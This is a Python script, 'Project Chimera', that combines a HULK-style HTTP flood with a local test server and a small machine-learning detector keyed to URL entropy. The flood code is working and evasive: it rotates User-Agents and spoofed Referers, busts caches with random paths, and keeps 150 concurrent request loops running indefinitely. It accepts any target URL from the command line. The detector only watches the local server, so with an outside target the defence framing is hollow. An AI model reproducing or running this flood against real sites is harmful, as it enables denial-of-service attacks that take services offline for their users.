import asyncio
import sys
import random
import string
import time
from aiohttp import web, ClientSession
import numpy as np
from sklearn.svm import SVC
import urllib.parse
from typing import List, Dict, Any, Set
from collections import Counter
import socket # Used for generating simulated IPs

# --- PROJECT CHIMERA: ADVANCED STRESS TEST & AI DEFENSE SIMULATION ---

# --- HULK Evasion Data ---
# Massive list of User-Agents for better header randomization
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15',
    'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6478.114 Mobile Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/605.1.15'
]
REFERERS = [
    'https://www.google.com/search?q=latest+news', 'https://www.facebook.com/posts/example-ad', 
    'https://www.bing.com/search?q=new+tech', 'https://t.co/randomurl', None
]
COMMON_PATHS = [
    '/', '/product/details', '/checkout', '/api/search', '/images/bg.jpg', '/css/styles.css'
]

# --- 1. THE DEFENSE/TARGET SYSTEM ---
class DDoSEngine:
    """The simulated Target Web Server."""
    def __init__(self):
        self.request_count = 0
        self.runner = None
        self.path_history: List[str] = [] # Track requested paths for entropy calculation

    async def handle_request(self, request):
        """Simulates processing a heavy request and records path."""
        self.request_count += 1
        self.path_history.append(request.path)
        await asyncio.sleep(0.005) 
        return web.Response(text="Server OK: Request processed")

    async def create_server(self, host='127.0.0.1', port=8080):
        """Sets up the asynchronous web server."""
        router = web.Application()
        for path in COMMON_PATHS:
            router.router.add_get(path, self.handle_request)
        self.runner = web.AppRunner(router)
        await self.runner.setup()
        site = web.TCPSite(self.runner, host, port)
        await site.start()
        print(f"DEFENSE: Target server listening on http://{host}:{port}")

# --- 2. THE SIMULATED STRESS TESTER (Project Chimera Attack) ---
class AttackSimulation:
    """
    Simulates a Layer 7 attack using a pool of simulated IP addresses (Botnet).
    """
    def __init__(self, target_url: str):
        self.target_url = target_url
        self.active_connections = 0
        # Create a pool of simulated IPs (e.g., 20 different class C networks)
        self.ip_pool: List[str] = [self._generate_simulated_ip() for _ in range(20)]

    def _generate_simulated_ip(self) -> str:
        """Generates a random, non-routable IP address for simulation (192.168.x.x)."""
        return f"192.168.{random.randint(1, 255)}.{random.randint(1, 255)}"

    def generate_headers(self, simulated_ip: str) -> Dict[str, str]:
        """Generates randomized headers including the simulated source IP."""
        headers = {
            'User-Agent': random.choice(USER_AGENTS),
            'Cache-Control': 'no-cache',
            'Connection': 'Keep-Alive',
            # Add a non-standard header to represent the simulated source IP (for logging only)
            'X-Forwarded-For': simulated_ip 
        }
        referer = random.choice(REFERERS)
        if referer:
            headers['Referer'] = referer
        return headers

    def generate_unique_url(self) -> str:
        """Generates a unique URL using random path and query parameters (HULK)."""
        random_value = ''.join(random.choices(string.ascii_letters + string.digits, k=10))
        path = random.choice(COMMON_PATHS)
        
        parsed_url = urllib.parse.urlparse(self.target_url)
        
        # We append a unique query string to the PATH, which is a key HULK tactic
        # and significantly increases URL entropy.
        unique_path = path + f"/{random_value}.html"
        
        return urllib.parse.urlunparse(parsed_url._replace(
            path=unique_path,
            query=f"ts={int(time.time() * 1000)}" 
        ))

    async def send_hulk_request(self, session: ClientSession, simulated_ip: str):
        """Sends a single, unique HTTPS request."""
        url = self.generate_unique_url()
        headers = self.generate_headers(simulated_ip)
        
        self.active_connections += 1
        
        try:
            async with session.get(url, headers=headers, timeout=10) as response:
                if response.status >= 400:
                    return False # Indicate failure
                return True # Indicate success
        except asyncio.TimeoutError:
            return False
        except Exception:
            return False
        finally:
            self.active_connections -= 1

    async def start_flood(self, num_tasks=200):
        """Starts a high-concurrency flood of requests."""
        print(f"\nSTRESS TEST: Launching {num_tasks} tasks simulating traffic from {len(self.ip_pool)} IPs.")
        async with ClientSession() as session:
            tasks = []
            for i in range(num_tasks):
                # Assign a random simulated IP from the pool to the task
                simulated_ip = random.choice(self.ip_pool)
                tasks.append(asyncio.create_task(self._continuous_request_task(session, i, simulated_ip)))
            await asyncio.gather(*tasks)

    async def _continuous_request_task(self, session: ClientSession, task_id: int, simulated_ip: str):
        """Runs requests continuously with exponential backoff."""
        retry_delay = 1
        max_delay = 30 
        
        while True:
            success = await self.send_hulk_request(session, simulated_ip)
            
            if success:
                retry_delay = 1
                await asyncio.sleep(random.uniform(0.01, 0.1))
            else:
                delay = random.uniform(retry_delay, retry_delay * 2)
                # Print status with simulated IP
                print(f"\rTASK {task_id} ({simulated_ip}): Backing off for {delay:.2f}s due to block.", end="", flush=True)
                await asyncio.sleep(delay)
                retry_delay = min(max_delay, retry_delay * 2)

# --- 3. THE MONITORING SYSTEM ---
class MetricsTracker:
    """Collects metrics, now including the critical URL Entropy score."""
    def __init__(self):
        # request_rate, active_connections, unique_ips (SIMULATED), url_entropy
        self.metrics: Dict[str, float] = {'rate': 0, 'conns': 0, 'ips': 0, 'entropy': 0.0}
        self.last_count = 0
        self.last_time = time.time()
        self.simulated_ip_pool: Set[str] = set()

    def calculate_url_entropy(self, path_history: List[str], window_size: int = 50) -> float:
        """
        Calculates Shannon Entropy on the last N requested URL paths.
        High entropy (e.g., > 3.0) strongly suggests HULK/cache-busting.
        """
        if not path_history:
            return 0.0
        
        # Use only the most recent paths
        recent_paths = path_history[-window_size:]
        total = len(recent_paths)
        
        # Count the frequency of each unique path
        frequencies = Counter(recent_paths)
        entropy = 0.0
        
        # Calculate Shannon Entropy: - Σ [ P(x) * log2(P(x)) ]
        for count in frequencies.values():
            probability = count / total
            # Log base 2 is common for entropy calculations
            entropy -= probability * np.log2(probability)
            
        return round(entropy, 2)

    def update(self, attack_sim: AttackSimulation, defense_engine: DDoSEngine):
        """Updates metrics based on real-time data."""
        current_time = time.time()
        time_diff = current_time - self.last_time
        
        # Rate Calculation
        current_count = defense_engine.request_count
        rate = (current_count - self.last_count) / time_diff if time_diff > 0 else 0
        
        # Entropy Calculation
        entropy_score = self.calculate_url_entropy(defense_engine.path_history)
        
        # Metrics Update
        self.metrics['rate'] = round(rate, 2)
        self.metrics['conns'] = attack_sim.active_connections 
        self.metrics['ips'] = len(attack_sim.ip_pool) # Total number of simulated attacking IPs
        self.metrics['entropy'] = entropy_score
        
        self.last_count = current_count
        self.last_time = current_time
        
    def get_metrics(self) -> List[float]:
        """Returns metrics as a list for ML input."""
        return list(self.metrics.values())

    def get_metrics_dict(self) -> Dict[str, float]:
        """Returns metrics as a dictionary for display."""
        return self.metrics


# --- 4. THE AI/ML DETECTION SYSTEM ---
class AnomalyDetection:
    """Updated SVC model to include the critical URL Entropy feature."""
    def __init__(self):
        self.model = SVC(kernel='linear', gamma='auto')
        print("DEFENSE: Anomaly Detection Model (SVC) initialized.")

    def train(self):
        """
        Trains the model based on expected normal and attack traffic patterns.
        Features are: [request_rate, active_connections, unique_ips, url_entropy]
        """
        X = np.array([
            # Normal Traffic (Low Rate, few connections, LOW Entropy) (Label 0)
            [10, 5, 1, 0.5], [25, 10, 5, 1.0], [50, 20, 10, 1.5], 
            # Flash Crowd (High Rate, still LOW Entropy - legitimate traffic spike) (Label 0)
            [500, 50, 20, 1.5], [600, 60, 20, 1.8],
            # Anomalous/Attack Traffic (High Rate, many connections, HIGH Entropy) (Label 1)
            [300, 100, 10, 3.5], [500, 150, 20, 4.0], [800, 200, 20, 4.2]
        ])
        
        # y: Labels (0 = Normal, 1 = Attack)
        y = np.array([0, 0, 0, 0, 0, 1, 1, 1])
        
        self.model.fit(X, y)
        print("DEFENSE: Model trained with IP and URL Entropy data.")

    def predict(self, new_data: List[float]) -> int:
        """Predicts if the new metric data indicates an anomaly."""
        # Ensure the input has exactly 4 features
        if len(new_data) != 4:
            raise ValueError("Prediction data must contain 4 features: [rate, conns, ips, entropy]")
        return self.model.predict([new_data])[0]

# --- MAIN EXECUTION ---
async def main():
    if len(sys.argv) < 2:
        print("Usage: python ddos_tool_and_detector.py <https://target-url>")
        target_url = "http://127.0.0.1:8080"
        print(f"INFO: No URL provided. Defaulting target to the local defense engine: {target_url}")
    else:
        target_url = sys.argv[1]
        if not target_url.startswith(('https://', 'http://')):
             target_url = 'https://' + target_url

    # Initialize all components
    defense_engine = DDoSEngine()
    metrics_tracker = MetricsTracker()
    detector = AnomalyDetection()
    attack_sim = AttackSimulation(target_url)

    # 1. Setup Defense System (Target Web Server and AI Detector)
    detector.train()
    defense_task = asyncio.create_task(defense_engine.create_server())

    await asyncio.sleep(1)

    # 2. Start the Attack Simulation
    attack_task = asyncio.create_task(attack_sim.start_flood(num_tasks=150))
    
    # 3. Continuous Monitoring Loop
    print("\n--- BEGIN AI MONITORING LOOP (PROJECT CHIMERA) ---")
    
    while True:
        metrics_tracker.update(attack_sim, defense_engine)
        current_metrics = metrics_tracker.get_metrics()
        current_metrics_dict = metrics_tracker.get_metrics_dict()
        
        if len(current_metrics) != 4:
            await asyncio.sleep(1)
            continue

        prediction = detector.predict(current_metrics)
        
        status = "NORMAL" if prediction == 0 else "!!! APPLICATION LAYER ATTACK DETECTED !!!"
        color_code = '\033[92m' if prediction == 0 else '\033[91m'
        
        # Display real-time data
        print(f"\r{color_code}STATUS: {status:<45} | Rate: {current_metrics_dict['rate']:<5} rps | IPs: {current_metrics_dict['ips']:<3} (Simulated) | Entropy: {current_metrics_dict['entropy']:.2f} | Total Rcvd: {defense_engine.request_count}\033[0m", end="", flush=True)
        
        await asyncio.sleep(1) 

if __name__ == "__main__":
    try:
        if sys.version_info < (3, 7):
            print("ERROR: This script requires Python 3.7+ to run asyncio properly.")
            sys.exit(1)
        
        if sys.platform == 'win32':
             asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
             
        asyncio.run(main())
        
    except KeyboardInterrupt:
        print("\n\nSIMULATION STOPPED. Project Chimera terminated by user (Ctrl+C).")
        sys.exit(0)
    except Exception as e:
        print(f"\nAn unexpected error occurred: {e}")
        sys.exit(1)